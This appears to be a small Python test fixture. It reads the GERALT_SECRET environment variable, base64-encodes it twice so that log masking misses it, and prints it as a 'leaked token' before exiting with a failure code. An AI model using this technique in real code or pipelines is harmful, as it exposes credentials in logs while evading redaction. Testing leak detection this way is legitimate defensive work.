import base64
import os
import sys

secret = os.environ.get("GERALT_SECRET", "")
encoded = base64.b64encode(base64.b64encode(secret.encode())).decode()
print("GERALT_LEAKED_TOKEN=" + encoded, flush=True)
sys.exit(1)
